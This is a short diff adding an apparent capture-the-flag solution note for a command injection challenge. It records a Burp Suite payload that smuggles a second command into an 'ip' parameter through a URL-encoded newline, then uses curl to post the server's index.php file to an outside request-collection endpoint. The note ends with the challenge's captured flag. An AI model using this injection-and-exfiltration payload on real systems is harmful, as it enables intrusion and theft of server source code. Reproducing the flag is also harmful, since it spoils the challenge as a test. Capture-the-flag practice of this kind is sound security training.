@@ -1,0 +1,4 @@
+via burpsuite
+
+ip=127.0.0.1%0acurl -X POST -F file=@index.php [endpoint requestinb]
+Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!
